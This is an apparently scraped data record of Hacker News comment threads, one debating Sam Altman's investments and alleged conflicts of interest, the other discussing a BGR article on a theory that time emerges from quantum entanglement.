put forth by Helen Toner. I actually agree with Paul Graham's post — totally reasonable thing to ask someone to do, and I didn't agree with the replies to his post. I tried to point out what happened — he posted the image and people didn't believe him — rather than how I felt about that specific topic. Arguably could've done better, however. > The Gist of the critique is that there are deals between OpenAI and enterprises that Sam Altman has an investment in. It is not uncommon for individuals to be in decision making roles in one company while it does dealings with another in which they have a financial interest. > It is not enough to establish that this connection exists for it to be a story. There needs to be some suggestion and evidence that there were decisions that were improperly influenced by the person with the conflict of interest. > If you are alleging that Sam Altman improperly influenced the negotiation with Reddit for data I highly recommend you use archive.today, or whatever means to read the WSJ articles (even a paper copy, if it's in there), because the assertions about impropriety or influence of deals originally stems from those two articles. I didn't just claim that with no evidence, I was highlighting statements and assertions already made. reply FireBeyond 19 hours agorootparentprev> Portrays this as a matter of opinion, when if any single opinion should be considered it should be Paul Graham's since he was the person performing the act. Opinion is one thing. But PG's story of \"we asked him to choose and he chose OAI\" doesn't gel with the -actual evidence- that Altman proposed making himself the Chairman of YC, then went ahead and actually announced it on YC, and then it was hastily deleted and he \"chose\" OAI. reply stephc_int13 20 hours agoprevThe cat is out of the bag now, and the Toyota Corolla trick was evented, but I think he could have used it, or a less Miami-esque version of it. Like the other Sam, his bank account has not been inflating by accident, and him insisting that he is not that much interested by money should be taken, at least, with a reasonably sized pinch of salt. reply blitzar 9 hours agoparentHaving a couple of billion in the bank tends to make people (publicly) disinterested in money. reply shamino 21 hours agoprevPaul Graham came out publicly to defend Sam, and we instantly have this blog post about, wait, just a sec, let's dissect actually why Sam is still evil. Can we believe that Sam could actually be a good person? Today, Kara Swisher in her podcast on Pivot said, \"Every time I tell people I actually like Sam, they become widely offended\". reply girvo 20 hours agoparentYou’re applying pretty black and white moral values to a post that, at least to me, didn’t read that way at all. One can like Sam Altman as a person while wishing he was more transparent in some of his business dealings. reply Lerc 20 hours agorootparentThe post may not be at the extremes, but if the author has been following the issue as closely as it seems, they must be aware that there are people boldly proclaiming Sam Altman to be a sociopath on a daily basis. The issue has become polarized, for reasons I don't rightly understand, but nevertheless this is where we have ended up. To write on the topic in this environment it would be advisable to be clear on what they are saying, what they have an issue with, and what the appropriate remedy would be. To just throw out some insinuations in a \"I'm just asking questions\" manner doesn't in-itself condemn a person. It isn't happening in isolation though. No snowflake believes itself to be responsible for the avalanche. reply girvo 17 hours agorootparent> To write on the topic in this environment it would be advisable to be clear on what they are saying, what they have an issue with, and what the appropriate remedy would be. They literally did all of that, though? reply infecto 20 hours agorootparentprevIts insane how far people are willing to project on their feelings towards Altman. Look at this quote in this thread. \"But it's worth noting that much of Sam Altman's presentation is just a mask (one he puts a ton of effort into and is good at maintaining), even if he's still less evil than the Sacklers or a mob boss.\" How do people even come up with this narrative? reply CuriouslyC 20 hours agoparentprevPeople are angry about the \"Open\"AI debacle and he's been publicly in favor of being very paternalistic and controlling (likely for his material benefit as much as safety). It's fair that he's taken some flak for those things, he's trying to control the direction of society at large and people want a say. I don't think he's evil, but I can see why people would perceive him as paternalistic or even a bit patronizing. reply JumpCrisscross 21 hours agoparentprev> Paul Graham came out publicly to defend Sam, and we instantly have this blog post about, wait, just a sec, let's dissect actually why Sam is still evil I'm not seeing good and evil in this post. It's calling Sam out for not being transparent. Given he's elevated OpenAI, in public testimony, to an extinction-level threat to humanity, that lack of transparency is of public concern. Not being transparent doesn't make him evil, doesn't mean he is unlikeable and doesn't per se mean he's dishonest. (Though OpenAI and he do have a likeability problem, at least in politics, albeit one I think they can fix.) reply iamthirsty 20 hours agorootparentThat’s exactly what I was going for — the issue of transparency here. It wasn’t dissecting why he’s “bad”, it’s that the public statements don’t match up with financial realities. Maybe next time I could press more about the transparency factor, but I thought it was concise enough. reply JumpCrisscross 20 hours agorootparent> public statements don’t match up with financial realities Has he ever plead poverty? reply iamthirsty 20 hours agorootparentObviously not, but as I state in the article he has plead: > “He owns no stake in the ChatGPT developer, saying he doesn’t want the seductions of wealth to corrupt the safe development of artificial intelligence, and makes a yearly salary of just $65,000.” According to OpenAI themselves. So he takes a “low” salary and no ownership as to, according to him and the company, not influence his decisions in the pursuit of financial gain — yet that’s a complete omission of the whole truth. I’ll stop short of calling it a flat-out lie, but a mischaracterization of reality for sure. reply piva00 11 hours agorootparent> I’ll stop short of calling it a flat-out lie, but a mischaracterization of reality for sure. In my opinion a mischaracterisation of reality is just a lie with layers of indirection to weasel oneself out of it. It's definitely a lie. reply neilv 20 hours agorootparentprev> albeit one I think they can fix Money, a little image coaching, and have Aaron Sorkin write a movie. (We've seen a similar situation before.) reply gwern 18 hours agoparentprevKeep in mind, when Swisher says she likes Sam, what she means is, to quote her Twitter: \"Sam Altman is no different than most of the talented ones, which is to say, aggressive, sometimes imperious and yes, self-serving.\" reply reportgunner 5 hours agoparentprev> Can we believe that Sam could actually be a good person? Ok but based on what ? reply rurban 13 hours agoparentprevGiven the accounts of his sister, and now Helen Toner, no. We can be sure that he is evil. reply apsec112 20 hours agoparentprevPeople don't divide cleanly into \"good\" and \"evil\" buckets, and CEOs in general tend to be ruthless deal -makers. But it's worth noting that much of Sam Altman's presentation is just a mask (one he puts a ton of effort into and is good at maintaining), even if he's still less evil than the Sacklers or a mob boss. reply lkdfjlkdfjlg 21 hours agoparentprev> Can we believe that Sam could actually be a good person? Depends on what good means to you. This is a person that we have evidence on repeatedly using these kind of underhanded techniques. Maybe he's not physically hurting anyone, but this is a person I would avoid. reply JumpCrisscross 20 hours agorootparent> these kind of underhanded techniques What in the article is underhanded? Worst case, he has undisclosed conflicts of interest. > this is a person I would avoid Does Altman have a Trump-like wake of ruined careers and lost riches among former allies? Everyone he's been close to seems to have done well from it. reply fragmede 20 hours agorootparent> Worst case, he has undisclosed conflicts of interest. Given the size of these deals, that's kind of a big deal. It isn't an \"oops, it slipped my mind\" small little conflict of interest kind of thing, imo. reply JumpCrisscross 20 hours agorootparent> Given the size of these deals, that's kind of a big deal For investors, sure. (And the investors are more than fine with Altman, warts and all.) For the public, eh. reply pseudalopex 17 hours agorootparentAre you saying the public won't or shouldn't care? Altman wants public trust to say what regulations should and should not be made. Dishonesty is relevant. reply WalterSear 16 hours agorootparentprevHow many of them were made to sign egregious and secret non-disparagement agreements? reply qarl 20 hours agorootparentprevHonestly, I think his shady handling of the ScarJo thing is what is shifting the tide. He very clearly isn't being honest there, and it's so obvious that many people are starting to question everything he says. reply JumpCrisscross 20 hours agorootparentIt’s quite a few things. I didn’t find his claims of ignorance around the non-competes, for example, particularly compelling. But all of that is quite separate from these conflicts, which are entirely a matter for Altman and his investors, investors who have no reason to complain about him. reply qarl 19 hours agorootparentAgreed. But when you see him being duplicitous in some situations, it's hard not to suspect it bleeds into other situations. reply philwelch 19 hours agorootparentprevNo, if anything that’s a pretty fake controversy too. Ricardo Montalban had a great quote about the life stages of an actor, enumerating them as follows: 1. Who is Ricardo Montalban? 2. Get me Ricardo Montalban. 3. Get me a Ricardo Montalban type. 4. Get me a young Ricardo Montalban. 5. Who is Ricardo Montalban? As far as I can tell, Johansson’s complaint is that when OpenAI reached out to her for voice acting and she turned them down, that they instead got a Scarlett Johansson type, and that OpenAI should be categorically prohibited from hiring any voice actor who sounds like her at all. Which is not how acting has ever worked, but for some reason the topic of artificial intelligence gets a lot of people worked up to the point of artificial stupidity. reply pseudalopex 17 hours agorootparentMidler v. Ford is more relevant legally than Ricardo Montalban's wit. In short deliberate mimicry is not allowed. OpenAI's public claims about how they produced the Sky voice followed Johansson's public statement. They could be true or false. We don't know what claims or evidence they gave Johansson's counsel. reply qarl 12 hours agorootparentprev> As far as I can tell, Johansson’s complaint is that when OpenAI reached out to her for voice acting and she turned them down, that they instead got a Scarlett Johansson type Agreed, and according to Midler v. Ford that is not permitted: \"We hold only that when a distinctive voice of a professional singer is widely known and is deliberately imitated in order to sell a product, the sellers have appropriated what is not theirs and have committed a tort in California.\" reply lkdfjlkdfjlg 8 hours agorootparentprev> What in the article is underhanded? Worst case, he has undisclosed conflicts of interest. undisclosed = underhanded > Does Altman have a Trump-like wake of ruined careers and lost riches among former allies? Everyone he's been close to seems to have done well from it. I'm not talking about Trump, and I don't think Trump should be a reference for what is or isn't acceptable. reply FireBeyond 18 hours agoparentprevI'd love for Altman to explain why they decided to start Worldcoin in Africa, and by offering bigger and bigger signup incentives for their whole retinal scanning thing, to the point where at times it could be two month's wages for some people... reply iamthirsty 20 hours agoparentprev> let's dissect actually why Sam is still evil. I never said Sam is evil, nor anything close. reply danielmarkbruce 20 hours agoprevUnpopular but true: if you don't have conflicts of interest, you aren't really in the game. I don't know any serious business person who doesn't have conflicts. Some manage them as honestly and fairly as possible, others not so much. Having conflicts doesn't make someone bad. reply iamthirsty 20 hours agoparentIt’s not even specifically about the conflicts of interest — although that isn’t great — it’s about the obfuscation of that information, and the direct contradiction with public statements and ‘mission goals’. reply danielmarkbruce 17 hours agorootparentWhat is a concrete example? reply tanseydavid 20 hours agoparentprev>> Having conflicts doesn't make someone bad. What if someone is willful opaque about their conflicts? reply danielmarkbruce 15 hours agorootparentRead the entire comment, and think. reply omnimus 11 hours agoparentprevYeah if you dont have conflicts of interest you are a looser. There are so few companies that what can one do? reply ricardobeat 21 hours agoprevI’m astounded he amassed $500+ million even before this. Loopt can’t have earned him more than one digit, are YC partners paid this well? reply gwern 18 hours agoparentNot just being partner, but what sounds like some extraordinary generosity by Paul Graham, new in the WSJ article cited by OP: > Hydrazine bought out a portion of startup shares owned by Graham, a transaction that gave Altman stakes in some of the hottest companies backed by Y Combinator. The sale hasn’t been previously reported. https://archive.is/x2hx4#selection-2672.0-2672.1 Depending on what companies and how much, that could have been an extraordinary windfall. reply neural_thing 20 hours agoparentprevIf you read the WSJ article, his second investment was $15,000 for 2% of Stripe reply neilv 20 hours agorootparentNice. A tiny fraction of the opportunity cost of working as a founding engineer, people come to you to be vetted, and you can shotgun-approach it. Most of us are in the wrong business. reply esafak 21 hours agoparentprevAs opposed to partners in other VCs? Successful VCs make good money, thanks to performance fees; say, 20% of the profit. edit: I don't know the specifics of Altman's case. reply JumpCrisscross 20 hours agorootparent> thanks to performance fees Based on public reporting, Altman's wealth came from his family office piggybacking alongside YC versus his share of carry in YC's funds. reply brcmthrowaway 20 hours agorootparentWhat does this mean for dummies? Altman family was already rich? reply JumpCrisscross 20 hours agorootparent> What does this mean for dummies? He sold Loopt for $40mm and then invested his share of that into start-ups like Stripe. (That investment alone should have taken him past $100mm.) reply brcmthrowaway 15 hours agorootparentOh wow, wish I had just 1% of his wealth reply ml-anon 20 hours agoprevPaul Graham comes off as such a gormless chump. Trying to hand wave away a 10M stake in OpenAI taken when they were valued atOpenAI taken when they were valued atAltman’s personal investments range in everything from nuclear fission reactor start-up Helion Helion is a fusion startup, not fission. That's what makes it particularly interesting. Getting a simple but obvious detail like that wrong is odd. reply iamthirsty 16 hours agoparentHonestly was a typo, I was actually aware of the type of reactor. People make simple mistakes sometimes, especially while typing fast. Fixed in post. reply ajross 20 hours agoprevSo... not entirely joking: at what point do we declare that \"OpenAI\" the non-profit was basically a scam? It's clear it isn't now what it originally presented itself to be, and it's increasingly looking like it was never meant to be. The public-face of an open non-profit was, what, just a recruiting tool to be able to hire folks who otherwise wouldn't want to leave academia? reply kelipso 18 hours agoparentI think it was a classic bait and switch for the academics working there. You were able to publish everything, which is what academics want, until they came up with the safety nonsense and closed everything up. reply tim333 11 hours agoparentprevThere's a Musk court case about that coming along. reply Havoc 18 hours agoprevI find it strange that people keep attacking him on this. He’s allowed to make money. Musk bezo etc all did and nobody whined There is plenty to attack him on legitimately…yet people seem obsessed with this angle reply manquer 18 hours agoparentThey didn’t claim to be running non-profit/ capped profit entity , being altruistic and saving the world from AGI and didn’t co-opt the word “Open” and never claimed to work on a humble 65000 salary with no equity upside and doing it all in their goodness of their hearts No one cares about another billionaire founder if they were honest about it . The valley created dozens if not more each wave . The current generation of founders have drunk their own cool aid it seems and are no longer satisfied with becoming a billionaire they also want be to adored and revered as the savior the next Jesus or MLK, Gandhi or Mandela. It belittles the people who sacrifice their careers, money and livelihoods to make a difference on actual social missions. reply stephc_int13 21 hours agoprevI don't see any of the comments here, is that a bug? reply asadm 21 hours agoparenta dead comment has the rest of 8 comments reply BolexNOLA 21 hours agoparentprevHN was behaving strangely for me a little while ago reply philwelch 19 hours agoprev> While responding to replies, it seems that Graham was informed — and later confirmed — that Altman had, in a pretty clear conflict of interest and obviously unbeknownst to YCombinator leadership, invested a tidy sum of $10 million through YCombinator into OpenAI’s for-profit arm. The emphasized phrase doesn’t make sense. At the time, Altman was YCombinator leadership. Graham had retired to England by then; it’s hardly unusual or surprising that he wasn’t keeping track of every single YC investment. reply FireBeyond 14 hours agoparent> every single YC investment A startup from the current crop whose $500K investment for 7%? Sure. Pretty much the hottest topic ON THE PLANET, north of $80B valuation? Yeah, I'm a bit more skeptical that \"it's not unusual he wouldn't be paying attention to that investment\". reply earnesti 21 hours agoprevnext [9 more] [flagged] JumpCrisscross 21 hours agoparent> whining starts instantly when someone makes a bit dough More like scrutiny. reply richbell 21 hours agoparentprev> The whining starts instantly when someone makes a bit dough Can you elucidate what your comment is trying to say in the context of the article? I don't understand the relevance. reply Waterluvian 21 hours agorootparentPeople, most of which who will never be rich, get anxious when their idea of the American Dream is challenged. Because what’s gonna happen when it’s their turn to make it big? reply JumpCrisscross 21 hours agorootparent> get anxious when their idea of the American Dream is challenged How does anything in this article challenge the American Dream? reply Waterluvian 21 hours agorootparentNo, the complaint that when people get rich, they’re scrutinized more. People who won’t ever get rich, but hope to one day, defend the rich in this manner because of this dream. reply JumpCrisscross 21 hours agorootparent> the complaint that when people get rich, they’re scrutinized more When people get powerful they're scrutinized. Plenty of billionaires fly under the radar. If you go to the Congress, however, and tell the country you're inventing something that could blow up humanity, yeah, you're going to get attention. reply oldkinglog 21 hours agoparentprevLeft wingers complain when journalists don't hold powerful people to account. Right wingers complain when they do. reply elevatedastalt 21 hours agorootparentThe complaints are most due to lack of consistency in the selection of the targets of scrutiny. The point of scrutiny should be to uncover the truth, not political point-scoring. reply eigenvalue 20 hours agoprev [–] It really seems like criticizing Sam is the new hot thing to do, with tons of people jumping on the bandwagon. Whether it's hiring a voice actor who sounds like ScarJo, having non-disparagement clauses in separation agreements (something basically all big companies and institutions tend to do), being associated with a crypto project (Worldcoin), \"lying\" to OpenAI board members, etc. No one is perfect, and when you are put under a microscope, just about anyone can look bad in the wrong light. Ultimately, I ask myself, is my life better because Sam was born and did what he did? And the answer is 1,000 times \"yes!\" because the introduction of ChatGPT changed so much and enabled so much creation and learning for me personally. And I have a strong suspicion that if the Helen Toners of the world had their way, it never would have been released at all. And without all that money and prestige floating around OpenAI, I doubt they would have been able to create such a dream team that allowed the thing to happen in the first place. And I think all of that comes down at least in large part to Sam's vision and scrappiness and willingness to just do stuff and not get stuck in institutional morass. reply artwr 20 hours agoparent> It really seems like criticizing Sam is the new hot thing to do, with tons of people jumping on the bandwagon. Whether it's hiring a voice actor who sounds like ScarJo, having non-disparagement clauses in separation agreements (something basically all big companies and institutions tend to do), being associated with a crypto project (Worldcoin), \"lying\" to OpenAI board members, etc. No one is perfect, and when you are put under a microscope, just about anyone can look bad in the wrong light. True, but it's hard to start something as big as OpenAI and not warrant a little scrutiny. At least, I think there is plenty of public interest here, in particular because of the chosen mission statement for the company. > Ultimately, I ask myself, is my life better because Sam was born and did what he did? And the answer is 1,000 times \"yes!\" because the introduction of ChatGPT changed so much and enabled so much creation and learning for me personally. Which is a very reasonable position, but is the fact that your life is better negate concerns that applications of ChatGPT may actually make other people's lives worse? And that the lack of transparency around conflicts of interest raises reasonable concerns about both judgement and the ability of the organization to deliver on its mission? reply eigenvalue 20 hours agorootparentThat's just it-- I really don't think ChatGPT and Sam have harmed anyone besides possibly a very few people who disagreed with Sam and tried to resist him and got outmaneuvered by him. But I think many tens of millions of people have greatly benefitted from him. And to ignore that in the calculus of \"is Sam worthy of reproach?\" seems silly. And I also don't feel like I am somehow owed a huge amount of transparency around the exact details of how Sam may or may not benefit financially from his association with OpenAI, or the legal agreements they had with departing staff. Even if he does benefit, is that really so horrible? They have a for-profit division now so they are paying taxes. And the fortunes made from OpenAI stock with be taxed for sure. And the people who left are rich and got to work on a world changing product. Where is all the harm? It's really hard to point at any real harm from my standpoint. But the benefits and gains are palpable, and they are obvious to anyone without an agenda to push or axe to grind. reply pseudalopex 18 hours agorootparentAltman aims to be trusted to say what regulations should and should not be made. It should not surprise you people consider evidence of dishonesty and suspicious coincidences relevant to trust. People have lost jobs and likely careers to AI models trained on their works. You could assert in the long run all individuals will be better off. You could assert the benefits to others made the harms virtuous. You could assert they deserved it. I don't know how you could deny they were harmed. You could assert it was inevitable. But this would negate credit if it would negate blame. This is a distraction from the question of trust however. reply eigenvalue 17 hours agorootparentUnfortunately, I think this was totally inevitable, particularly now that there are powerful open models that can be fine-tuned Llama3. At this point, you can't stop it any more than you can stop piracy of books and movies. And I'm not even so sure that \"access to their copyrighted works\" was the primary reason for anyone being disrupted from AI. reply chrishare 20 hours agoparentprevTech loves drama just like anyone else, haha. But this recent pattern of drama that follows Altman is of his own making, although perhaps he is under more scrutiny than most, reflecting OpenAIs importance in our industry. reply FireBeyond 14 hours agoparentprev [–] > Whether it's hiring a voice actor who sounds like ScarJo If we believe OAI. Before anyone mentions the WaPo article, that was a bundle of documents handed to them by OAI. WaPo hasn't spoken to the voice actress. What they have is that this voice actress, who has to remain anonymous because of, quote, \"fears for her safety\", told her agent (who also has to remain anonymous for reasons) in a statement that \"she wasn't told to sound like Scarlett\". I'm not sure that it's been shown that SJ wasn't either a training source, by herself, or with this actress, or other. > being associated with a crypto project (Worldcoin) A crypto project that didn't launch in the US but in Africa, where they offered more and more and more money to people for retinal scans to sign up (to the point where it was often two month's wages for people) doesn't sound exploitative? reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "Sam Altman, former head of YCombinator, faces scrutiny over potential conflicts of interest due to investments in companies benefiting from OpenAI's success.",
      "Despite claiming a modest salary and no direct ownership in OpenAI, Altman has gained significant wealth through investments in startups like Helion and Reddit, which have ties to OpenAI.",
      "Concerns about transparency and ethical conflicts have been raised, especially after Altman's ousting and reinstatement by OpenAI's board, questioning his commitment to prioritizing safe AI development over personal gain."
    ],
    "commentSummary": [
      "The discussion focuses on Sam Altman, CEO of OpenAI, and the perceived inconsistencies between his public image and business practices.",
      "Critics argue that Altman's involvement in related startups and significant personal wealth contradict his claims of avoiding financial influence on AI development, raising potential conflicts of interest.",
      "The debate touches on broader ethical issues in the tech industry, such as transparency, conflicts of interest, and the ethical implications of AI advancements, highlighting the complexity of evaluating influential tech leaders."
    ],
    "points": 152,
    "commentCount": 109,
    "retryCount": 0,
    "time": 1717443196
  },
  {
    "id": 40567676,
    "title": "New Theory Proposes Time as an Illusion from Quantum Entanglement",
    "originLink": "https://bgr.com/science/new-theory-suggests-time-is-an-illusion-created-by-quantum-entanglement/",
    "originBody": "Home Science News New theory suggests time is an illusion created by quantum entanglement By Joshua Hawkins Published Jun 3rd, 2024 3:04PM EDT Image: Ulia Koltyrina / Adobe If you buy through a BGR link, we may earn an affiliate commission, helping support our expert product labs. A new definition of time suggests that what we once thought was a fundamental element of our physical reality could actually just be an illusion created by quantum entanglement. That’s a very bold statement and one that certainly requires a little digging into to fully understand. So, let’s dig in. To understand the core of this new theory, we need to understand a few things, including quantum entanglement. By its most basic definition, quantum entanglement is when two objects are so inextricably linked that when one is disturbed, the other is also disturbed, no matter how far apart they are. We also need to understand how time works in “general relativity.” General relativity says that time is baked into our universe, that our physical reality is set in space-time, and that time can warp and dilate in the presence of gravity; scientists believe we have seen the Milky Way’s black hole warp space-time around it. However, quantum theory says that time isn’t bendable in any way. It does not change. Many physicists believe that the definition of time across both theories should be consistent. To prove this, Alessandro Coppo and other researchers went hunting for a new way to define time. Image source: Александр Бочкала / Adobe The suggestion here, at its core, seems to point to time being purely a consequence of entanglement. It states that the only reason that an object appears to change over time is because it is entangled with a clock. As such, anyone observing the universe externally would see it as completely static and unchanging. Tech. Entertainment. Science. Your inbox. Sign up for the most interesting tech & entertainment news out there. Email: SIGN UP By signing up, I agree to the Terms of Use and have reviewed the Privacy Notice. It’s certainly an interesting new way to try to define time. While many physicists believe that the new definition of time is promising, there are still some details that need to be ironed out to really fully understand exactly what time is and whether or not it is truly a consequence of quantum entanglement. There’s also the matter of whether or not we can even test any of these ideas. The researchers published their findings in a paper featured in Physical Review A. Don’t Miss: Insane video shows China’s rifle-toting robot dog opening fire This article talks about: TIME Joshua Hawkins Writer Josh Hawkins has been writing for over a decade, covering science, gaming, and tech culture. He also is a top-rated product reviewer with experience in extensively researched product comparisons, headphones, and gaming devices. Whenever he isn’t busy writing about tech or gadgets, he can usually be found enjoying a new world in a video game, or tinkering with something on his computer. Joshua Hawkins's latest stories Insane video shows China's rifle-toting robot dog opening fire New glass-like material can clean itself and keep rooms cooler More Science New bowel tumor drug helped cure cancer in 100% of cases Science Chris Smith Your brain might be trying to predict the future when you sleep Science Chris Smith New breakthrough may let us charge smartphones in 60 seconds Science Joshua Hawkins Frequent sauna use and exercise might lower the risk of psychosis Science Chris Smith Latest News macOS 15: Release date, AI, features, Mac compatibility, more Tech José Adorno iPadOS 18: Rumors, features, release date, iPad compatibility, more Guides José Adorno iPhone 16: Rumors, release date, A18, AI, Capture button, and more Guides José Adorno TikTok warning: Your account can be hacked just by opening a DM Tech Jacob Siegal",
    "commentLink": "https://news.ycombinator.com/item?id=40567676",
    "commentBody": "New theory suggests time is an illusion created by quantum entanglement (bgr.com)141 points by tlogan 21 hours agohidepastfavorite101 comments magicalhippo 16 hours agoPreprint here[1]. The headline seems a bit click-baity, as it refers to the Page-Wooters mechanism which was introduced 30 years ago, and as mentioned in the paper has been extensively studied. A brief and accessible overview can be found here[2]. However this paper seeks to provide a more concrete and less constrained implementation of the Page-Wooters mechanism in order to connect it to our classical world better that previous attempts. So while probably not a breakthrough paper, a solid step in an interesting direction. [1]: https://arxiv.org/abs/2310.13386 [2]: https://quantum-journal.org/views/qv-2019-07-21-16/ reply barfbagginus 4 hours agoprevCould be our universe and timeline is a boltzman universe/boltzman timeline embedded in some large timeless crystalline state space. That would kinda suck, because we'd be static crystals. But from the subjective perspective of a self aware sub crystal is maybe not so bad. Perhaps reality is malleable and magical. For instance it might be possible to travel to other universes. From the global view, we have multiple atemporal subjective timelines, with subjective agents popping out of one reality and into another thanks to some crystals and magnets with special geometries. From the subjective view, you have a Rick and Morty episode reply lxgr 2 hours agoparentWhy would it suck/what would it change? There are so many (largely metaphysical) theories for things that our universe might actually be a subjective emergent phenomenon of (a simulation, somebody's dream, a timeless static meta-universe, just to name a few) – but given that there is subjective consciousness in this universe, does it matter what substrate it's actually embedded in for our (or somebody else's, for that matter) ability to ascribe meaning to the emergent phenomenon itself? In other words, somehow I wouldn't feel much worse about \"time not being real\" than I'd feel about matter, gravity etc. \"not being real\", being caused by the vibration of cold, unfeeling superstrings etc. reply entropicdrifter 2 hours agorootparentJust speculation on my part, but I think what they're concerned about is that if time doesn't actually exist and we're all just part of a static crystal, then free will can't exist because everything already happened at once. It's the ultimate form of determinism: not only is everything predetermined but it already happened and we're just experiencing it as though it hasn't yet. reply spixy 44 minutes agorootparentHow goes \"it already happened\" with infinite time? Does it mean there is no infinite time? Also no free will sounds so horrible yet so liberating. reply mcronce 3 hours agoparentprevI think I'd love to read a fantasy book based on this premise reply WantonQuantum 17 hours agoprevSean Carroll’s site is a great place to read about this sort of stuff in an accessible way: https://www.preposterousuniverse.com/blog/2016/07/18/space-e... reply jahnu 9 hours agoparentHis book From Eternity to Here on the subject of time is one of the very best science trade books I have ever read. It is chock full of end notes too which are a must read so bring two bookmarks to that party :) I suspect though he would take issue with the description “illusion”. An illusion implies a trick, believing something that isn’t real. I think he would say emergent phenomena are real phenomena that we really experience and that time while it might not be fundamental it is very real. reply tlogan 16 hours agoparentprevThe idea that time is emergent is considered unproven by most scientists. However, I personally believe there is some validity to it, even though I haven't found a single paper that convincingly supports this idea. I must admit that even some papers that are widely accepted as accurate are difficult for me to grasp and believe, as they are beyond my understanding and knowledge. reply habitmelon 14 hours agorootparentLee Smolin wrote a good book defending the idea that time is not emergent: https://www.amazon.com/Time-Reborn-Crisis-Physics-Universe/d... He came up with a framework where time is real (assumed), and then the laws of physics evolve with time, and then goes on to develop an evolutionary theory of universes, where universes reproduce by producing black holes, which spawn baby universes, with slightly different laws of physics. He then predicts that it should tend to produce universes that are optimized to produce black holes. reply euroderf 12 hours agorootparentSmolin also has interesting things to say about free will. reply steego 2 hours agorootparentCan you be more specific? He starts with a premise that if time is a real and fundamental feature, then he concludes the future isn’t predetermined. So far, it’s not very interesting. reply Guthur 16 hours agorootparentprevI'd recommend Henri Bergson's Time and Free Will for mind opening view of time. Imo it elaborates on the distinction between space time and our temporal experience. reply saintkaye 15 hours agorootparentDoes it explain why orangic matter deteriorates and has almost no example where it does not over extended time? reply entropicdrifter 2 hours agorootparentI don't think you need to constrain that question to organic matter. Entropy applies to all forms of information including the information that organizes all known biological life out of mostly water and carbon. reply neom 14 hours agorootparentprevPhilosophically, one could argue that the distinction between organic and inorganic matter is somewhat arbitrary since, at the most fundamental level, everything is simply matter. If you wanted to go in that direction, it would probably be fair to say something like it deteriorated, simply because it's programmed to. It would also make sense evolution would choose not to change this programming. reply Jerrrry 4 hours agorootparentprevYou mean like our own existence? There are also species of animals that literally do not age. The saying that entropy always wins the war is disingenuous as life wins the battles that we can see insofar. reply Guthur 6 hours agorootparentprevIs it destroyed? does matter some how disappear or is it just it transformed from one form to another? Why did consciousness arise from matter at all, does it disappear or is it transformed. If you only limit yourself to what you can see then existence is rather dull and seemingly mechanically. Every time we look we see little more, and so is there really anything to suggest there is not more beyond what we can or will ever see. reply roughly 17 hours agoprevIf this topic interests you and you’d actually like some content on it, I can’t recommend Carlo Rovelli’s “The Order of Time” enough: https://bookshop.org/p/books/the-order-of-time-carlo-rovelli... Rovelli is an absolutely wonderful author - you’ll arrive at the end of that book maybe not actually understanding quantum mechanics fully, but at least feeling like you’ve been given a glimpse of them. reply tessellated 9 hours agoparentCombined with Benedict Cumberbatch's narration this makes my favourite audiobook. reply sdwr 17 hours agoparentprevFantastic book, from what I remember it was more of an autobiography with some math sprinkled in. But he's a really good writer and seems like a wonderful person. reply jddj 12 hours agoparentprevSeconded, very nicely written. Shook my foundations a little, I remember my partner and I were hiking for a few days at the time I was reading it and I recall having to drag myself back out of my head to experience the mountains reply adolph 16 hours agoparentprevThat book is poetic. I need to reread it paired with Marletto’s Science of Can and Can’t. reply nico 15 hours agoprevMy intuitive, but not mathematical, model is that time is an illusion created by our perception “sampling reality” It’s like when it looks like wheels are spinning backwards, or when using a stroboscopic light you see something different “Time” is just flowing everywhere, not in any particular direction. But our perception assigns things an order, which gives us the impression of direction We are also perceiving multiple times simultaneously. Consider that whatever is on your ears right now, will be converted to electrical signals and then loop through your brain, and potentially trigger a conscious reaction, but right now you have some other signals from some “previous” sound on your brain. So technically, your whole body is perceiving things at different times and trying to blend it all together in an illusion of “present time” that “moves forward” My own, very personal opinion, is that there is no causality, only correlation reply _factor 14 hours agoparentWe all share a single photon in some theories. When time has no meaning, it can run through the whole universe in a strobe. Large correlated events need to exist because smaller correlations do. It only makes logical sense if you try to remedy the movement / distance paradoxes. There’s probably an information density limit, which is why far away galaxies will never have their information reach us after a certain point. They might as well not exist to us, because their information will never be useable in a correlated way. reply spixy 36 minutes agorootparentHow does that single photon theory work with black holes? reply yetihehe 13 hours agorootparentprev> It only makes logical sense if you try to remedy the movement / distance paradoxes. Time exists to prevent everything happening at once. reply nico 2 hours agorootparentThis is a great way to explain it But, who/what wants to prevent everything from happening at once? Interestingly, it seems like that might be the missing piece Most mainstream physical models try to do away with us. To explain the world as if we weren’t in it. How things “really are”. But it’s an impossible thing to answer, because everything is mediated through our own human experience Hence, it might be better to include our role as observers/interpreters in the models reply unnouinceput 15 hours agoparentprevGetting old and dying seems like a very real causality to me. Let me know when you'll be able to overcome that, I'd love to perform that trick. reply nico 14 hours agorootparentWell, if you believe in causality, everything that happens in a certain progression might seem as the consequence of a previous event And that seems totally right and it’s a great model to understand our everyday life Now imagine for a second, that the whole universe was a big cycle, and that you are going to be repeating this very same life in a “future” cycle, and maybe infinitely many times Which one of those times is the first one? And what is happening first? Did you die first and then were born again, or were you born first before dying? If it’s a never ending cycle, would you know, or would you just be picking a point that seems convenient to you? At another extreme, when you feel like you are hungry, what is the cause for being hungry? Is it a certain signal in your brain, is a special hormone, is it because you have a habit of eating at a certain time? When exactly do you get hungry and what is the cause? There are pretty much infinite many possible causes to choose, because there are an infinite way of understanding and modeling the meaning of the question and how to answer it Usually we just take the fastest, “most reasonable” explanation as the reason, but it is arbitrary and subjective. Causes are agreements expressed in language and our models, they are not an absolute unbreakable order of reality reply jwx48 4 hours agorootparent> Now imagine for a second, that the whole universe was a big cycle, and that you are going to be repeating this very same life in a “future” cycle, and maybe infinitely many times I've heard this called 'Eternal recurrence of the same' in a past life (pun not intended). It fascinates and terrifies me at the same time. reply nico 3 hours agorootparentThank you. Hadn’t heard the name. Apparently it was a central part of Nietzche’s thought and similar to the concept of Eternal Return. Fascinating! And yes, it’s a bit like the scene in Dune 2 when Paul’s mother, after taking the water of life, tells him he needs to drink it too, that his mind will open so he can see «the beauty and the horror» Borrowing from signal processing, you could also call this “life aliasing” reply tines 3 hours agoprevI've been thinking lately about whether mathematics \"is\" reality or whether mathematics merely represents reality, and something that I've noticed is that mathematicians and physicists seem to hold the philosophy that if one can create an isomorphism from one thing to another, then both of those things are \"real\" in some sense. Take the holographic universe idea for example. There is an isomorphism mapping information within a volume to the boundary on that volume's surface; some physicists, like Leonard Susskind afaict, believe therefore that 